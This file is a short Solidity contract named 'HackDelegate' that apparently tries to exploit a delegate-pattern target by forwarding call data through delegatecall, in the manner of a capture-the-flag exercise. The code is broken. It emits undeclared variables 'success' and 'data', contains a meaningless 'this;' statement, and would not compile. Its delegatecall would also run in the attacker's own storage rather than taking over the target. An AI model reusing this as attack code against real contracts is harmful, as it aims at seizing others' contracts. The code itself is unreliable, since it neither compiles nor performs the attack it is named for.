// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDelegate {
  fallback() external;
}

contract HackDelegate {
  IDelegate delegateAddress;
  event Successful(bool success, bytes data);

  constructor(IDelegate _delegateAddress) public {
    delegateAddress = IDelegate(_delegateAddress);
  }

  function callFallback() external {
    (bool result,) = address(delegateAddress).delegatecall(msg.data);
    if (result) {
      this;
    }
  
    emit Successful(success, data);
  }
}
